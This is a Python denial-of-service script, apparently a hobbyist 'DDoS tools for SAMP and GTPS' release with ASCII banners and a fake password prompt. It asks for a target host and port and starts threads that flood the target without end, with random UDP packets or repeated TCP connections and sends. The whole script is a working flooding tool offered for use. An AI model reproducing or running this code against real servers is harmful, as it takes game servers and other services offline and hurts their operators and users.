#!/usr/bin/env python3
#Codeid By XD3MP;SAMP
import random
import socket
import threading
import time
import os

#login tools
password ="NUKLIR SAMP"

print("""\u001b[35m                              
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝
""")
for i in range(3):
	pwd = input("\u001b[37m[ + ] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[ + ] Please Security To Password!!! ")
		break
	else:
		time.sleep(5)
		print("\u001b[31m[ × ] Wrong IS Security Password!!! ")
		continue
time.sleep(5)
print("\u001b[35m{ √ } Successfully Loginned")
time.sleep(2)
os.system("clear")

print("""
\u001b[35m
Codeid By XD3MP;SAMP

██╗░░██╗██████╗░███████╗███╗░░░███╗██████╗░
╚██╗██╔╝██╔══██╗██╔════╝████╗░████║██╔══██╗
░╚███╔╝░██║░░██║█████╗░░██╔████╔██║██████╔╝
░██╔██╗░██║░░██║██╔══╝░░██║╚██╔╝██║██╔═══╝░
██╔╝╚██╗██████╔╝███████╗██║░╚═╝░██║██║░░░░░
╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░ """)
print("""\u001b[37m
WELCOME TO MY TOOLS
>> MY DISCORD : XD3MP:SAMP#2208
>> DDOS TOOLS FOR SAMP AND GTPS
>> DON'T ABUSE THIS TOOLS BITCH
""")
time.sleep(2)

os.system("clear")

ip = str(input("\u001b[37m[ + ] ENTER | HOST/IP :\u001b[35m    "))
port = int(input("\u001b[37m[ + ] ENTER | PORT:\u001b[35m     "))
choice = str(input("\u001b[37m[ + ] ENTER | UDP(y/n) :\u001b[35m  "))
times = int(input("\u001b[37m[ + ] ENTER | CONNECTIONS :\u001b[35m  "))
threads = int(input("\u001b[37m[ + ] ENTER | THREADS :\u001b[35m  "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[ 1 ]","[ 2 ]","[ 3 ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
		except:
			print("[ 1 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[ 1 ]","[ 2 ]","[ 3 ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
		except:
			s.close()
			print("[ 2 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
